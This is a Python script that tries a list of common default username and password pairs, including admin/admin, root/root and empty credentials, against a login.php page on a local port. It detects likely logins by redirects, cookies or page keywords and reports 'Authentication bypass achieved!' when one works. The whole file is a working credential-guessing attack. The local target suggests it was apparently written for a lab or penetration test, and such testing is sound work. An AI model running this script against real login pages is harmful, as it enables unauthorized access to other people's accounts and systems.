import requests
import time

base_url = "http://127.0.0.1:33001"
login_url = f"{base_url}/login.php"

print("DEFAULT CREDENTIALS & BRUTE FORCE TESTING")
print("=" * 80)
print()

# Try common default credentials
default_creds = [
    ('admin', 'admin'),
    ('admin', 'password'),
    ('admin', '123456'),
    ('admin', 'admin123'),
    ('administrator', 'administrator'),
    ('administrator', 'password'),
    ('root', 'root'),
    ('root', 'password'),
    ('user', 'user'),
    ('user', 'password'),
    ('test', 'test'),
    ('demo', 'demo'),
    ('guest', 'guest'),
    ('phpmyadmin', 'phpmyadmin'),
    ('', ''),  # Empty credentials
    ('admin', ''),  # Empty password
    ('', 'admin'),  # Empty username
]

successful_logins = []
anomalies = []

print("[TESTING DEFAULT CREDENTIALS]")

for username, password in default_creds:
    try:
        resp = requests.post(
            login_url,
            data={'username': username, 'password': password},
            timeout=5,
            allow_redirects=False
        )
        
        has_incorrect = 'incorrect' in resp.text.lower()
        has_error = 'error' in resp.text.lower()
        
        # Check for success indicators
        is_success = False
        success_reasons = []
        
        # No "incorrect" message = likely success
        if not has_incorrect and not has_error:
            is_success = True
            success_reasons.append("NO_ERROR_MESSAGE")
        
        # Status code change (redirect)
        if resp.status_code == 302:
            is_success = True
            success_reasons.append(f"REDIRECT: {resp.headers.get('Location', '')}")
        
        # Cookies set
        if resp.cookies:
            is_success = True
            success_reasons.append(f"COOKIES: {dict(resp.cookies)}")
        
        # Different content length (might indicate different page)
        if len(resp.text) > 0 and 'incorrect' not in resp.text.lower():
            # Check for successful login indicators
            success_indicators = ['welcome', 'dashboard', 'admin', 'profile', 'logout', 'home', 'welcome back']
            if any(indicator in resp.text.lower() for indicator in success_indicators):
                is_success = True
                success_reasons.append("SUCCESS_KEYWORDS_FOUND")
        
        if is_success:
            successful_logins.append({
                'username': username,
                'password': password,
                'status': resp.status_code,
                'cookies': dict(resp.cookies),
                'location': resp.headers.get('Location', ''),
                'reasons': success_reasons,
                'response': resp.text[:500]
            })
            print(f"  [!] SUCCESS: '{username}' / '{password}' -> {resp.status_code}")
        else:
            marker = "✗" if has_incorrect else "?"
            print(f"  [{marker}] '{username}' / '{password}' -> {resp.status_code}")
            
    except Exception as e:
        print(f"  [ERR] '{username}' / '{password}': {e}")
    
    time.sleep(0.05)

print("\n" + "=" * 80)
print("RESULTS")
print("=" * 80)

if successful_logins:
    print(f"\n[SUCCESSFUL LOGINS: {len(successful_logins)}]")
    for login in successful_logins:
        print(f"\n  Username: '{login['username']}'")
        print(f"  Password: '{login['password']}'")
        print(f"  Status: {login['status']}")
        print(f"  Cookies: {login['cookies']}")
        print(f"  Location: {login['location']}")
        print(f"  Reasons: {', '.join(login['reasons'])}")
        print(f"  Response snippet:\n{login['response']}")
else:
    print("No successful logins found with default credentials.")

# Summary
print("\n" + "=" * 80)
print("SUMMARY")
print("=" * 80)
print(f"Credentials tested: {len(default_creds)}")
print(f"Successful logins: {len(successful_logins)}")
print(f"Result: {'Authentication bypass achieved!' if successful_logins else 'All attempts blocked - secure authentication'}")

